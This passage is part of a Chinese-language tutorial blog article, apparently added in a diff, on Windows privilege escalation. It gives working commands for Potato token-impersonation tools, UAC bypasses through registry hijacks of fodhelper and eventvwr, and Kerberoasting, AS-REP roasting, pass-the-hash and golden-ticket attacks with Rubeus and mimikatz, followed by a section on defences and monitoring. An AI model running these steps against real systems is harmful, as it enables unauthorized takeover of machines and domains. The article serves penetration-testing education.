+<td><strong>VNC&#x2F;SNMP 密码</strong></td>
+<td>注册表中可能存储编码密码</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、特权滥用提权"><a href="#五、特权滥用提权" class="headerlink" title="五、特权滥用提权"></a>五、特权滥用提权</h2><p>利用已有特权（主要是 SeImpersonatePrivilege）进行令牌模拟，从服务账户提升到 SYSTEM。</p>
+<h3 id="5-1-Potato-攻击核心原理"><a href="#5-1-Potato-攻击核心原理" class="headerlink" title="5.1 Potato 攻击核心原理"></a>5.1 Potato 攻击核心原理</h3><p>所有 Potato 攻击共享同一原语：</p>
+<blockquote>
+<p>拥有 <strong>SeImpersonatePrivilege</strong> 的服务账户，通过强制 SYSTEM 进程向攻击者控制的端点认证，利用模拟权限窃取 SYSTEM 令牌，最终通过 <code>CreateProcessAsUser</code> 创建 SYSTEM 进程。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. 攻击者创建命名管道 / RPC 端点<br>2. 诱使 SYSTEM 进程连接<br>3. 利用 SeImpersonatePrivilege 模拟 SYSTEM<br>4. 窃取并复制 SYSTEM 令牌<br>5. CreateProcessAsUser(SYSTEM_token, &quot;cmd.exe&quot;)<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-2-Potato-工具演进"><a href="#5-2-Potato-工具演进" class="headerlink" title="5.2 Potato 工具演进"></a>5.2 Potato 工具演进</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>触发机制</th>
+<th>适用系统</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>JuicyPotato</strong></td>
+<td>DCOM RPC</td>
+<td>Win10 1809 以前</td>
+<td>旧版有效，新版已修补</td>
+</tr>
+<tr>
+<td><strong>PrintSpoofer</strong></td>
+<td>Print Spooler 管道</td>
+<td>Win10&#x2F;Server 2016+</td>
+<td>现代系统推荐</td>
+</tr>
+<tr>
+<td><strong>RoguePotato</strong></td>
+<td>PrintNotify COM</td>
+<td>Win10 1809+</td>
+<td>需要辅助机器</td>
+</tr>
+<tr>
+<td><strong>SweetPotato</strong></td>
+<td>DCOM + 管道</td>
+<td>通用</td>
+<td>统一触发方式</td>
+</tr>
+<tr>
+<td><strong>GodPotato</strong></td>
+<td>综合 RPC&#x2F;DCOM</td>
+<td>现代系统</td>
+<td>兼容性最佳</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># JuicyPotato（旧系统）</span><br>JuicyPotato.exe -l 1337 -p <span class="hljs-string">&quot;cmd.exe&quot;</span> -a <span class="hljs-string">&quot;/c whoami&quot;</span> -t *<br><br><span class="hljs-comment"># PrintSpoofer（现代系统推荐）</span><br>PrintSpoofer.exe -i -c <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span><br><br><span class="hljs-comment"># GodPotato（兼容性最好）</span><br>GodPotato.exe -cmd <span class="hljs-string">&quot;cmd /c whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Win10 1809+ 首选 PrintSpoofer 或 GodPotato。PrintSpoofer 依赖 Print Spooler 服务，部分 Server Core 默认关闭。</p>
+</blockquote>
+<h3 id="5-3-SeDebugPrivilege-利用"><a href="#5-3-SeDebugPrivilege-利用" class="headerlink" title="5.3 SeDebugPrivilege 利用"></a>5.3 SeDebugPrivilege 利用</h3><p>拥有 SeDebugPrivilege 可附加任意进程，读取其内存并窃取令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. OpenProcess(SYSTEM_PID, PROCESS_ALL_ACCESS)<br>2. OpenProcessToken → 获取 SYSTEM 令牌<br>3. DuplicateTokenEx → 复制令牌<br>4. CreateProcessWithTokenW → 创建 SYSTEM 进程<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、UAC-绕过提权"><a href="#六、UAC-绕过提权" class="headerlink" title="六、UAC 绕过提权"></a>六、UAC 绕过提权</h2><p>当当前用户<strong>已是管理员组成员</strong>（但处于 Filtered Token 状态），可通过 UAC 绕过静默提升到 High Integrity，无需弹出提示。</p>
+<h3 id="6-1-自动提升机制"><a href="#6-1-自动提升机制" class="headerlink" title="6.1 自动提升机制"></a>6.1 自动提升机制</h3><p>某些 Microsoft 签名二进制可静默提升，需同时满足：</p>
+<ul>
+<li>嵌入清单中 <code>autoElevate = true</code></li>
+<li>由 Microsoft 签名</li>
+<li>位于 <code>C:\Windows\System32</code></li>
+</ul>
+<h3 id="6-2-常见绕过方法"><a href="#6-2-常见绕过方法" class="headerlink" title="6.2 常见绕过方法"></a>6.2 常见绕过方法</h3><p><strong>fodhelper.exe 注册表劫持：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">reg add HKCU\Software\Classes\ms-settings\Shell\Open\<span class="hljs-built_in">command</span> /d <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span> /f<br>reg add HKCU\Software\Classes\ms-settings\Shell\Open\<span class="hljs-built_in">command</span> /v <span class="hljs-string">&quot;DelegateExecute&quot;</span> /f<br>fodhelper.exe<br></code></pre></td></tr></table></figure>
+
+<p><strong>eventvwr.exe 绕过：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">reg add HKCU\Software\Classes\mscfile\Shell\Open\<span class="hljs-built_in">command</span> /d <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span> /f<br>eventvwr.exe<br></code></pre></td></tr></table></figure>
+
+<p><strong>computerdefaults.exe 绕过：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">reg add HKCU\Software\Classes\ms-settings\Shell\Open\<span class="hljs-built_in">command</span> /d <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span> /f<br>computerdefaults.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-3-UACME-工具"><a href="#6-3-UACME-工具" class="headerlink" title="6.3 UACME 工具"></a>6.3 UACME 工具</h3><p>UACME 包含数十种绕过技术：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">UACME.exe -a 3  <span class="hljs-comment"># 方法 3 对应 fodhelper 绕过</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>UAC 绕过要求当前用户是管理员组成员。标准用户无法使用此路径。</p>
+</blockquote>
+<hr>
+<h2 id="七、Active-Directory-域环境提权"><a href="#七、Active-Directory-域环境提权" class="headerlink" title="七、Active Directory 域环境提权"></a>七、Active Directory 域环境提权</h2><p>域环境提权通过 AD 信任关系、Kerberos 协议和组策略，从低权限域用户提升到 Domain Admin。</p>
+<h3 id="7-1-BloodHound-路径分析"><a href="#7-1-BloodHound-路径分析" class="headerlink" title="7.1 BloodHound 路径分析"></a>7.1 BloodHound 路径分析</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 SharpHound 收集</span><br>SharpHound.exe --CollectionMethods All --Domain domain.local<br><br><span class="hljs-comment"># 导入 BloodHound GUI，查询最短攻击路径</span><br><span class="hljs-comment"># 例如：&quot;当前用户到 Domain Admin 的最短路径&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-2-Kerberoasting"><a href="#7-2-Kerberoasting" class="headerlink" title="7.2 Kerberoasting"></a>7.2 Kerberoasting</h3><p>任何域用户可请求 SPN 的 TGS 票据，离线破解服务账户密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 Rubeus</span><br>Rubeus.exe kerberoast /outfile:hashes.txt<br><br><span class="hljs-comment"># 离线破解</span><br>hashcat -m 13100 hashes.txt wordlist.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-3-AS-REP-Roasting"><a href="#7-3-AS-REP-Roasting" class="headerlink" title="7.3 AS-REP Roasting"></a>7.3 AS-REP Roasting</h3><p>针对设置了 <code>DONT_REQUIRE_PREAUTH</code> 的账户，无需密码即可请求 AS-REP 票据：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找不需要预认证的账户</span><br>Get-ADUser -Filter &#123;DoesNotRequirePreAuth -eq <span class="hljs-variable">$true</span>&#125;<br><br><span class="hljs-comment"># 使用 Rubeus</span><br>Rubeus.exe asreproast /nowrap /outfile:hashes.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-4-Pass-the-Hash-Pass-the-Ticket"><a href="#7-4-Pass-the-Hash-Pass-the-Ticket" class="headerlink" title="7.4 Pass the Hash &#x2F; Pass the Ticket"></a>7.4 Pass the Hash &#x2F; Pass the Ticket</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Pass the Hash</span><br>mimikatz <span class="hljs-comment"># sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash_here</span><br><br><span class="hljs-comment"># Pass the Ticket</span><br>mimikatz <span class="hljs-comment"># kerberos::ptt /ticket:ticket.kirbi</span><br><br><span class="hljs-comment"># Golden Ticket（伪造 TGT）</span><br>mimikatz <span class="hljs-comment"># kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /user:admin /ptt</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-5-GPP-密码解密"><a href="#7-5-GPP-密码解密" class="headerlink" title="7.5 GPP 密码解密"></a>7.5 GPP 密码解密</h3><p>组策略首选项（GPP）密码使用公开的 AES 密钥加密，可解密 SYSVOL 中的 <code>Groups.xml</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /b /s \\domain.local\SYSVOL\*.xml<br>gpp-decrypt <span class="hljs-string">&quot;encrypted_password_here&quot;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、自动化提权工具"><a href="#八、自动化提权工具" class="headerlink" title="八、自动化提权工具"></a>八、自动化提权工具</h2><p>手动检查容易遗漏，自动化工具可系统性扫描提权面。实际中通常组合使用。</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>语言</th>
+<th>核心功能</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>WinPEAS</strong></td>
+<td>C#</td>
+<td>全面枚举，红&#x2F;黄高亮</td>
+<td>首次全面检查</td>
+</tr>
+<tr>
+<td><strong>PowerUp</strong></td>
+<td>PowerShell</td>
+<td>服务检查 + 自动利用</td>
+<td>PS 环境</td>
+</tr>
+<tr>
+<td><strong>Seatbelt</strong></td>
+<td>C#</td>
+<td>主机信息收集</td>
+<td>系统评估</td>
+</tr>
+<tr>
+<td><strong>PrivescCheck</strong></td>
+<td>PowerShell</td>
+<td>结构化检查报告</td>
+<td>报告生成</td>
+</tr>
+<tr>
+<td><strong>Watson</strong></td>
+<td>C#</td>
+<td>补丁与漏洞比对</td>
+<td>漏洞识别</td>
+</tr>
+<tr>
+<td><strong>WES</strong></td>
+<td>Python</td>
+<td>补丁缺失分析</td>
+<td>补丁状态</td>
+</tr>
+<tr>
+<td><strong>Sherlock</strong></td>
+<td>PowerShell</td>
+<td>已知漏洞检测</td>
+<td>快速扫描</td>
+</tr>
+</tbody></table>
+<p><strong>推荐工作流程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. WinPEAS 全面扫描 → 获取高亮风险项<br>2. Seatbelt 补充主机信息<br>3. Watson / WES 检查补丁缺失<br>4. PowerUp Invoke-AllChecks 检测配置错误<br>5. 针对高风险项手动验证和利用<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御与缓解"><a href="#九、防御与缓解" class="headerlink" title="九、防御与缓解"></a>九、防御与缓解</h2><h3 id="9-1-最小权限原则"><a href="#9-1-最小权限原则" class="headerlink" title="9.1 最小权限原则"></a>9.1 最小权限原则</h3><ul>
+<li>服务账户使用最小权限，避免不必要的 SeImpersonatePrivilege &#x2F; SeDebugPrivilege</li>
+<li>应用池账户不加入本地管理员组</li>
+<li>普通用户不加入 Administrators 组</li>
+<li>域账户避免拥有本地管理员权限</li>
+</ul>
+<h3 id="9-2-服务与注册表加固"><a href="#9-2-服务与注册表加固" class="headerlink" title="9.2 服务与注册表加固"></a>9.2 服务与注册表加固</h3><ul>
+<li>服务路径用双引号包围</li>
+<li>审计服务二进制和路径权限，移除普通用户写权限</li>
+<li>禁用 AlwaysInstallElevated 组策略</li>
+<li>审计 <code>HKLM\SYSTEM\CurrentControlSet\Services</code> 键权限</li>
+<li>清理 Unattend 文件和配置文件中的明文密码</li>
+</ul>
+<h3 id="9-3-补丁管理"><a href="#9-3-补丁管理" class="headerlink" title="9.3 补丁管理"></a>9.3 补丁管理</h3><ul>
+<li>保持补丁最新，关注本地提权 CVE</li>
+<li>域控制器和客户端同步更新</li>
+<li>使用 WSUS 控制部署节奏</li>
+<li>高风险服务器建立快速回滚机制</li>
+</ul>
+<h3 id="9-4-监控审计"><a href="#9-4-监控审计" class="headerlink" title="9.4 监控审计"></a>9.4 监控审计</h3><table>
+<thead>
+<tr>
+<th>事件 ID</th>
+<th>描述</th>
+<th>提权相关性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4672</td>
+<td>特殊权限分配</td>
+<td>检测异常特权授予</td>
+</tr>
+<tr>
+<td>4688</td>
+<td>进程创建</td>
+<td>监控可疑进程</td>
+</tr>
+<tr>
+<td>4673</td>
+<td>特权服务调用</td>
+<td>检测特权滥用</td>
+</tr>
+<tr>
+<td>4656</td>
+<td>对象句柄请求</td>
+<td>审计敏感文件访问</td>
+</tr>
+</tbody></table>
+<ul>
+<li>启用进程创建审核</li>
+<li>监控 SeImpersonatePrivilege 使用</li>
+<li>使用 EDR 检测异常令牌获取</li>
+<li>定期审计日志</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Windows 提权是多层次技术体系，实战中遵循以下方法论：</p>
+<ol>
+<li><strong>先收集，再利用</strong> — <code>systeminfo</code>、<code>whoami /priv</code>、<code>wmic qfe</code> + WinPEAS 全面收集</li>
+<li><strong>内核优先</strong> — 未打补丁则 Watson&#x2F;WES 识别漏洞，选择稳定 Exploit</li>
+<li><strong>配置兜底</strong> — 补丁完善时重点查服务路径、注册表权限、计划任务、DLL 搜索路径</li>
+<li><strong>特权利用</strong> — <code>whoami /priv</code> 有 SeImpersonate 则 Potato，有 SeDebug 则进程注入</li>
+<li><strong>域环境特殊路径</strong> — BloodHound 路径分析 + Kerberoasting&#x2F;AS-REP&#x2F;PTH</li>
+</ol>
+<p>防御核心是<strong>最小权限原则</strong>和<strong>配置加固</strong>：定期审计、及时打补丁、启用监控，可有效降低提权风险。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><strong>HackTricks — Windows Local Privilege Escalation</strong> — 最全面的 Windows 提权技术 Wiki
+<a href="https://book.hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/">https://book.hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/</a></li>
+<li><strong>PayloadsAllTheThings — Windows Privilege Escalation</strong> — 提权方法与命令速查
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></li>
+<li><strong>PEASS-ng (WinPEAS)</strong>  — 自动化权限枚举工具
+<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></li>
+<li><strong>PowerSploit (PowerUp)</strong>  — PowerShell 提权检查与利用
+<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li>
+<li><strong>UACME</strong> — UAC 绕过技术集
+<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></li>
+<li><strong>SecWiki&#x2F;windows-kernel-exploits</strong> — Windows 内核漏洞利用集合
+<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
+<li><strong>Microsoft Learn — UAC 工作原理</strong> — 官方 UAC 机制文档
+<a href="https://learn.microsoft.com/windows/security/application-security/application-control/user-account-control/how-it-works">https://learn.microsoft.com/windows/security/application-security/application-control/user-account-control/how-it-works</a></li>
+<li><strong>BlackHat Asia 2021 — The Rise of Potatoes</strong> — Potato 攻击原理与演进
+<a href="https://i.blackhat.com/asia-21/Thursday-Handouts/as21-Cocomazzi-The-Rise-of-Potatoes-Privilege-Escalations-in-Windows-Services.pdf">https://i.blackhat.com/asia-21/Thursday-Handouts/as21-Cocomazzi-The-Rise-of-Potatoes-Privilege-Escalations-in-Windows-Services.pdf</a></li>
+</ol>
 ]]></content>
       <categories>
         <category>技术杂项</category>
